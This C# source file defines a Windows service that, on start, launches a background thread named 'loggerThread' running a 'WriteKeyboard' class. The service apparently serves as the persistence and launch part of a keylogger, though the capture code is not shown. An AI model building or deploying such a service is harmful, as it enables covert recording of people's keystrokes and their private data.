using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Threading;
using System.Text;
using System.Threading.Tasks;

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteKeyboard write = new WriteKeyboard();
            Thread loggerThread = new Thread(new ThreadStart(write.Work));
            loggerThread.Start();
        }

        protected override void OnStop()
        {
        }
    }
}
